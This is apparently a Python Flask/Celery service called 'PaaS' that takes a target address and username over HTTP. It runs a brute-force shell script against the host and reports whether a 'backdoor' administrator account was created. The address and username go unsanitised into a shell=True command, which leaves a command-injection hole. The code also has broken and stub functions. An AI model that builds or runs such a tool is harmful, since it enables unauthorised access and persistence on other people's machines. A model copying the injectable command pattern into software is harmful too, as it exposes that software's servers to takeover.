from flask import Flask, request, abort, jsonify
import subprocess as sp
from celery import Celery
from celery.result import AsyncResult
import requests

app = Flask(__name__)
app.config.update(
    CELERY_BROKER_URL='redis://52.167.48.81:6379/1',
    CELERY_RESULT_BACKEND='redis://52.167.48.81:6379/1'
)
celery = Celery(app.name, broker=app.config['CELERY_BROKER_URL'], backend=app.config['CELERY_RESULT_BACKEND'])

app.config["DEBUG"] = False
BF_FORMAT = './Bruteforcer.sh -a {address} -u {user}'


def BruteForce(address, username):
    process = sp.Popen(BF_FORMAT.format(user=username, address=address), shell=True,
                       stdout=sp.PIPE,
                       stderr=sp.PIPE)
    process.wait()
    stdout, stderr = process.communicate()
    stdout = stdout.decode('utf-8')
    print("stderr:", stderr)
    stderr = stderr.decode('utf-8')
    msg = ""
    success = True
    print("stdout:", stdout)
    if "The command completed successfully.\r\n\r\nThe command completed successfully.\r\n\r\n" in stdout:
        return success, "\nBackdoor created successfully on " + address


    elif "The account already exists." in stderr:

        msg += "\nDidnt create account as it already exsists on " + address
        if "The specified account name is already a member of the group." in stdout:
            msg += "\nThe user already is an administrator on " + address
        else:
            msg += "\nBackdoor created successfully on " + address
    else:
        success = False
        msg += "unknown error:{}".format(stderr)
    print("hi:")
    print(success,msg)
    return success, msg


def Laps():
    pass


def Vulnerablities():
    pass

def checkPrivilges(address):
    process = sp.Popen(BF_FORMAT.format(user="Witcher",paas="Switcher", address=address), shell=True,
                       stdout=sp.PIPE,
                       stderr=sp.PIPE)
    process.wait()
    stdout, stderr = process.communicate()
    stdout = stdout.decode('utf-8')
    print("stderr:", stderr)
    stderr = stderr.decode('utf-8')
    msg = ""
    success = True
    print("stdout:", stdout)


@celery.task
def update(result):
    req = requests.patch(f'http://10.0.0.7:3000/PaaS', data=result)
    return {"parent": result["task_id"], "data": result, "status_code": req.status_code, "msg": req.reason}


@celery.task(bind=True)
def _PaaS(self, steps, address, username):
    update({"success" : True, "message" : "Started PaaS", "task_id":request.id})
    success = ""
    msg = ""
    if "laps" in steps:
        update({"success" : True, "message" : "LAPS started", "task_id":self.request.id})
        #LAPS functions
        update({"success" : success, "message" : "LAPS returned: " + msg, "task_id":self.request.id})
        pass
        # TODO -> ADD LAPS
    if "Vulnerabilities" in steps:
        update({"success" : True, "message" : "Vulnerabilities started", "task_id":self.request.id})
        #Vulnerabilities functions
        update({"success" : success, "message" : "Vulnerabilities returned: " + msg, "task_id":self.request.id})
        
        pass
        # TODO -> ADD Vulnerabilites
    if "BruteForce" in steps:
        update({"success" : True, "message" : "Bruteforce started", "task_id":self.request.id})
        success, msg = BruteForce(address, username)
        update({"success" : success, "message" : "Bruteforce returned: " + msg, "task_id":self.request.id})
        
    return {"success": success, "msg": msg, "address":address, "task_id":self.request.id}


@app.route('/status/<task_id>', methods=['GET'])
def status(task_id):
    res = AsyncResult(task_id, app=celery)
    if res.status in ["FAILURE", "SUCCESS"]:
        return jsonify(status=res.status,**res.get())
    else:
        return jsonify(status=res.status)


@app.route('/PaaS', methods=['POST'])
def PaaS():
    print(request.json, request.form)
    if not request.json or 'address' not in request.json or 'username' not in request.json or 'steps' not in request.json:
        abort(400)
    task = _PaaS.apply_async(args=(request.json['steps'], request.json['address'], request.json['username']), link=update.s())
    return jsonify(task_id=task.id)

    # TODO?-> Vulnerabilities?


if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)
